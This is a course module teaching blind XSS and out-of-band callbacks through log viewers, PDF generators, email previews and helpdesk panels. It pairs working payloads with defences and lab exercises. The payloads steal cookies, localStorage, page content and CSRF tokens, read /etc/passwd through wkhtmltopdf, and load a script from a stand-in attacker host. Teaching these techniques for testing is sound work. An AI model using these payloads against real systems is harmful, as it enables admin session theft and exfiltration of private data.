Module 11 — Blind XSS & Out-of-Band Techniques

XSS Mastery Course · PhD-Level Cybersecurity · Prerequisite: Modules 01–10

1. What makes XSS "blind"?

In all prior modules, the attacker could see whether the payload fired: they controlled the request, waited for the response, and observed the alert or network request in their own browser session. Blind XSS breaks this assumption.

A blind XSS payload is stored in one place and executed in a completely different context — typically a privileged context the attacker has no direct access to:

Attacker injects payload
(contact form, username, log entry)
→
Server stores it
(DB, log file, queue)
→
Admin/privileged user
views the surface
→
Payload fires in
victim's browser
→
OOB callback to
attacker's server

The attacker never sees the execution — they only see the out-of-band callback: an HTTP request arriving at their controlled server, carrying evidence that the payload fired.

Key asymmetry: The attacker injects without confirmation. Later — hours, days, or weeks later — they receive an OOB callback that proves execution and delivers exfiltrated data. This is why blind XSS is sometimes called "time-delayed" or "asynchronous" XSS.

2. Out-of-band (OOB) callback mechanics

The payload's only job is to make an HTTP request to a server the attacker controls. The browser does this with:

TechniqueCodeNotes
Image beaconnew Image().src = urlNo CORS restriction. Works cross-origin. Returns silently.
fetch()fetch(url)Modern. CORS may block in strict mode. Use no-cors mode for beacons.
XMLHttpRequestnew XMLHttpRequest()Older, verbose. Same CORS rules as fetch.
navigator.sendBeaconnavigator.sendBeacon(url, data)Fires even on page unload. No response read. POST only.
WebSocketnew WebSocket(url)Used when HTTP is blocked by WAF or CSP img-src rules.
DNS lookupvia img src with attacker subdomainBypasses HTTP filtering. Burp Collaborator listens for DNS too.

The image beacon (new Image().src) is the most robust: it requires no CORS preflight, works cross-origin by design, fires even if the payload runs in a sandboxed context, and the 1×1 GIF response keeps it visually silent.

What the callback server captures automatically (without explicit exfiltration)

Every HTTP request the browser makes carries headers the attacker can read from the server log:

HeaderData exposed
RefererThe URL of the page where the payload executed — identifies the vulnerable surface
User-AgentBrowser and OS version — useful for targeted follow-up exploitation
OriginThe origin of the request — confirms same-origin or cross-origin context
CookieNot sent to cross-origin callback servers (SameSite policy) — must be exfiltrated explicitly via query string
IP addressVictim's IP → geolocation, corporate network range
Cookies and SameSite: Modern browsers set SameSite=Lax by default, which means cookies are NOT sent to cross-origin requests. To steal a cookie, the payload must read document.cookie and embed it in the URL: fetch('/oob?c='+document.cookie).

3. Common blind XSS surfaces

3.1 Application log viewers

Applications that log user activity — search terms, error messages, usernames, HTTP request data — and display those logs in a browser-rendered admin dashboard are a high-value blind XSS surface. The pattern:

  1. User (attacker) submits a payload in any field that reaches a log entry: search query, username, error message, form field, HTTP header.
  2. The application logs the raw value without sanitisation (common — logging libraries treat all values as strings, not HTML).
  3. An admin opens the log viewer. The browser renders the stored HTML. The payload fires in the admin's session.

Real-world examples: Kibana's log viewer (early versions rendered raw log data), custom ELK dashboards, Splunk search result displays, in-house log consoles.

3.2 PDF and report generators

Server-side PDF generators (wkhtmltopdf, Puppeteer, headless Chrome, Prince XML, WeasyPrint) work by:

  1. Accepting user-supplied content or templates
  2. Rendering the HTML in a headless browser engine
  3. Capturing a screenshot or DOM snapshot as PDF output

If user-supplied content reaches the HTML template without sanitisation, the headless browser renders the XSS payload. The execution context is a server-side headless browser — giving the payload access to the server's local network.

wkhtmltopdf SSRF via XSS: wkhtmltopdf renders local file URIs by default. A payload like <iframe src="file:///etc/passwd"> causes the PDF generator to include the server's local file in the PDF output — this is a combined XSS + SSRF that exfiltrates internal files. CVE-2019-6297 is one documented instance. 
<!-- wkhtmltopdf SSRF payload (illustrative) -->
<script>
  x = new XMLHttpRequest;
  x.onload = function(){ document.write(this.responseText); };
  x.open("GET","file:///etc/passwd");
  x.send();
</script>

3.3 Email template renderers

Applications that generate HTML emails from user-supplied fields (name, subject, body, notification message) and preview those emails in a webmail-style interface are blind XSS surfaces when the preview renders HTML without sanitisation.

Common injection points: the "From" display name, the email subject line, the email body, and notification preference fields. If any of these end up in an HTML email template rendered in a browser, they become XSS vectors.

3.4 Customer support / helpdesk platforms

When a user submits a support ticket, the ticket title, description, and attachment filenames are stored and later viewed by a support agent in an internal dashboard. If the dashboard renders raw HTML, the agent's browser (and session) is the victim. This has affected Zendesk, Freshdesk, and many custom helpdesk builds.

3.5 Profile fields viewed in admin panels

Username, bio, and website fields that are stored and later rendered in an admin user management panel are classic second-order blind XSS surfaces — exactly the pattern demonstrated in Module 10's /admin panel.

4. Payload engineering for blind XSS

4.1 Zero-interaction triggers

Because the attacker cannot see when the payload fires, it must fire without any user interaction — the admin just needs to load the page. Use the zero-interaction event handlers from Module 05:

VectorZero-interaction trigger
<img src=x onerror=...>onerror fires immediately when src fails to load
<svg onload=...>onload fires when SVG is parsed
<input autofocus onfocus=...>onfocus fires automatically on page load
<details open ontoggle=...>ontoggle fires on open state change at parse time
<body onload=...>onload fires when body element loads (if injection is before body)

4.2 Staged payload: confirm, then exfiltrate

A real blind XSS payload has two stages:

<img src=x onerror="(()=>{
  /* Stage 1: confirm execution */
  new Image().src = '/oob?hit=1&ref=' + encodeURIComponent(location.href);

  /* Stage 2: exfiltrate high-value data */
  const data = new URLSearchParams({
    cookie: document.cookie,
    url:    location.href,
    title:  document.title,
    ls:     btoa(JSON.stringify({...localStorage}))
  });
  fetch('/oob?' + data.toString(), {mode:'no-cors'});
})()">

4.3 DOM content exfiltration

When the payload fires in an admin panel, the DOM contains privileged data — admin user lists, CSRF tokens, API keys in hidden inputs, session tokens in JavaScript variables. Exfiltrate the full DOM:

fetch('/oob?dom=' + btoa(document.documentElement.innerHTML), {mode:'no-cors'});

Or target specific elements:

/* Steal all input values (hidden fields, CSRF tokens) */
const inputs = [...document.querySelectorAll('input')].map(i=>({name:i.name,value:i.value}));
fetch('/oob?inputs=' + btoa(JSON.stringify(inputs)), {mode:'no-cors'});

4.4 Same-origin fetch for API access

When the payload fires in an admin's browser, it runs in the admin's origin with the admin's cookies — enabling same-origin fetch requests to privileged API endpoints:

/* Fetch the admin user list and exfiltrate it */
fetch('/api/admin/users', {credentials:'include'})
  .then(r => r.text())
  .then(text => fetch('/oob?users=' + btoa(text), {mode:'no-cors'}));

5. Tooling: XSS Hunter and Burp Collaborator

5.1 XSS Hunter

XSS Hunter (xsshunter.com, also self-hostable) provides:

  • A hosted callback server at a unique subdomain (e.g., attacker.xss.ht)
  • A JavaScript payload that, on execution, captures: page URL, cookies, DOM snapshot, localStorage, referrer, and a screenshot via HTML2Canvas
  • An email notification when any payload fires
  • A dashboard showing all historical callbacks with full captured data

The standard XSS Hunter payload looks like:

<script src="https://attacker.xss.ht"></script>

It loads an external script that performs all exfiltration. The /oob endpoint in this lab models the receiving side of this infrastructure.

5.2 Burp Collaborator

Burp Suite Pro's Collaborator provides a hosted server that listens for HTTP, HTTPS, DNS, and SMTP callbacks. Used for:

  • Blind XSS callback detection (HTTP/HTTPS)
  • SSRF confirmation (HTTP + DNS)
  • XXE out-of-band exfiltration (DNS + HTTP)
  • Blind command injection (DNS)

In a test engagement, replace /oob with your Burp Collaborator URL and use the Collaborator client to see all incoming requests with full headers.

6. Dwell time and persistence advantage

The most strategically significant property of blind XSS is persistence. A payload injected into a log store, a support ticket, or a user profile may fire every time an admin views that surface — for weeks or months — until the record is deleted.

PropertyReflected XSSBlind Stored XSS
Requires victim to click a linkYesNo
Attacker sees executionYes (immediate)No (OOB callback only)
PersistenceSingle useFires on every admin page view
Target privilege levelAnyone with the linkTypically admin/privileged users
Detection difficultyModerate (URL-based evidence)High (no URL evidence at injection time)
Payload delivery rateAttacker-controlledVictim-controlled (when admin views)
Strategic value: A single blind XSS injection into a log store can yield dozens of admin session callbacks as different staff members view the logs over weeks. Each callback delivers fresh session data.

7. Defences specific to blind XSS

7.1 Output encoding at the rendering layer — not the storage layer

A common mistake is to "sanitise on input" at the logging endpoint. This fails when the same data is also used in non-HTML contexts (analytics, raw log files) where HTML encoding would corrupt the data. The correct fix is context-aware encoding at the render layer: HTML-encode every value when building the log viewer HTML.

7.2 Content Security Policy on admin surfaces

Admin log viewers, helpdesk panels, and report preview pages should have strict CSPs that block inline scripts and restrict img-src to known domains. This limits what an OOB beacon can reach even if payload execution occurs.

Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:

Note: CSP does not prevent fetch() or XMLHttpRequest to same-origin endpoints — a payload can still exfiltrate data to same-origin paths and trigger CSRF attacks even under strict CSP.

7.3 Trusted Types at rendering sinks

If the log viewer builds HTML via innerHTML, Trusted Types prevents assignment of arbitrary strings to that sink — forcing the use of a sanitiser library that returns a TrustedHTML type.

7.4 PDF generator hardening

  • Disable local file access in wkhtmltopdf: --disable-local-file-access
  • Use Puppeteer with --no-sandbox disabled and network access restricted to known domains
  • Pre-sanitise all user content with a server-side allowlist sanitiser before inserting into templates
  • Render PDF generation in an isolated container with no access to internal services

7.5 Email renderer hardening

  • Use a dedicated email sanitiser (e.g., email_reply_parser + DOMPurify) on the preview surface
  • Render email previews inside a sandboxed iframe: sandbox="allow-same-origin" (without allow-scripts)
  • Strip all HTML from fields that should be plain text (subject lines, display names)

8. Exercises

  1. Confirm basic blind execution: Using the attack demo, inject the bare OOB beacon (<img src="/oob?hit=1">) via POST /log-entry, open /log-viewer, and verify the callback appears in /oob/log. Note the Referer header — it confirms which surface the payload fired on.
  2. Exfiltrate DOM content: Craft a payload that, on execution in /log-viewer, fetches the full page DOM (document.documentElement.innerHTML), base64-encodes it, and sends it to /oob?dom=.... Inspect the captured data in /oob/log.
  3. PDF generator SSRF simulation: In the /pdf-preview surface, inject a payload that reads document.title and exfiltrates it via OOB. In a real wkhtmltopdf deployment, replace this with a file:// iframe read.
  4. Email header injection: In the /email-preview surface, inject a double-quote into the to= parameter to break out of the HTML attribute and inject markup. Confirm the To: field is rendered as raw HTML.
  5. Persistence audit: Inject payloads into three different surfaces (log entry, /board comment, /admin profile). Open each surface in sequence. Observe that each surfaces delivers a separate OOB callback — mapping the injection point via the Referer header. This models a real blind XSS audit across multiple application surfaces.
